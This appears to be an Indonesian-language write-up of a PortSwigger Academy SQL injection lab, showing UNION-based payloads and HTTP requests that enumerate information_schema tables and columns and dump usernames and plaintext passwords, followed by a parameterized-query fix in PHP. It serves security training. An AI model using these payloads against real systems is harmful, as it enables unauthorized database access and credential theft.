# [PortSwigger Academy] SQL Injection - Lab #5

## 📌 Detail Lab
* **Nama Tantangan:** SQL injection attack, listing the database contents on non-Oracle databases
* **Tingkat Kesulitan:** PRACTITIONER
* **Kategori:** SQL Injection (SQLi)
* **Tujuan Lab:** Menggunakan teknik UNION-Based SQLi untuk melakukan enumerasi skema database (mencari nama tabel dan kolom) pada database non-Oracle (seperti PostgreSQL/MySQL), lalu mengekstrak data kredensial administrator.

---

## 1. Analisis Celah Keamanan (Vulnerability Analysis)
Celah keamanan berada pada parameter filter kategori. Karena sistem ini menggunakan database non-Oracle yang standar, kita bisa memanfaatkan **`information_schema`** (sebuah skema bawaan yang menyimpan seluruh informasi metadata mengenai struktur database, tabel, dan kolom di dalamnya).

### Metodologi Ekstraksi Data Berstatus (*Information Schema*):
1. Cari nama tabel rahasia melalui `information_schema.tables`.
2. Cari nama kolom di dalam tabel tersebut melalui `information_schema.columns`.
3. Lakukan kueri langsung ke tabel target untuk mengambil data teks murni.

---

## 2. Langkah Eksploitasi & Proof of Concept (PoC)

### Menentukan Jumlah Kolom dan Tipe Data
Menggunakan teknik standar `ORDER BY` dan `UNION SELECT`, ditemukan bahwa kueri asli mengembalikan **2 kolom** dan **keduanya menerima tipe data string (teks)**.

### Mencari Nama Tabel (Enumerasi Tabel)
Untuk mencari tahu nama tabel yang menyimpan data pengguna, saya menyuntikkan kueri ke `information_schema.tables`. Kita mencari tabel yang mengandung kata 'user':

* **Payload:** `' UNION SELECT table_name, null FROM information_schema.tables WHERE table_name LIKE '%user%'--`

```http
GET /filter?category=Food+%26+Drink' UNION SELECT table_name, null FROM information_schema.tables where table_name LIKE '%user%'-- 
Host: 0a2c00d80334b5728178e81900d600d0.web-security-academy.net
```
Hasil: Pada respons halaman web, muncul nama tabel acak yang mencurigakan: users_zsjkvc

### Mencari Nama Kolom (Enumerasi Kolom)
Setelah mendapatkan nama tabel users_zsjkvc, langkah berikutnya adalah mencari nama kolom di dalam tabel tersebut menggunakan information_schema.columns:
* **Payload:** `' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'users_zsjkvc'--`
```
GET /filter?category=Food+%26+Drink' UNION SELECT column_name, null FROM information_schema.columns where table_name = 'users_zsjkvc'-- HTTP/2
Host: 0a2c00d80334b5728178e81900d600d0.web-security-academy.net
```
Hasil: Ditemukan dua nama kolom penting yang menampung data kredensial: username_srjpjw and password_enhdly.

### Menguras Data Kredensial (Data Dumping)
Kini kita menggabungkan nama tabel dan kedua nama kolom yang sudah didapatkan untuk mengekstrak data username dan password:
* **Payload:** `' UNION SELECT username_srjpjw, password_enhdly FROM users_zsjkvc--`
```
GET /filter?category=Food+%26+Drink' UNION SELECT username_srjpjw, password_enhdly FROM users_zsjkvc-- HTTP/2
Host: 0a2c00d80334b5728178e81900d600d0.web-security-academy.net
```

### Hasil Eksekusi Database
Di sisi backend database, kueri dimanipulasi secara penuh menjadi:
```
SELECT * FROM products WHERE category = 'Food+%26+Drink' UNION SELECT username_srjpjw, password_enhdly FROM users_zsjkvc--' AND released = 1
```
Hasil Akhir: Aplikasi menampilkan daftar seluruh user dan password teks murni (plain text) di layar. Cari baris milik user administrator, salin password-nya, dan gunakan untuk login. Lab berhasil diselesaikan (Solved).

---

## 3. Rekomendasi Perbaikan
Dampak dari serangan ini sangat destruktif karena penyerang dapat membaca seluruh isi basis data. Solusi mutlak untuk menghentikan injeksi ini adalah menerapkan Parameterized Queries (Prepared Statements).
Contoh Implementasi Perbaikan Kode (PHP PDO):
```
// KODE AMAN (SECURE)
$stmt = $db->prepare('SELECT * FROM products WHERE category = :category AND released = 1');
$stmt->execute(['category' => $_GET['category']]);
```
Dengan memisahkan struktur logika kueri SQL dari parameter input, karakter pembobol seperti ' UNION... tidak akan pernah dieksekusi sebagai perintah pencarian database oleh sistem.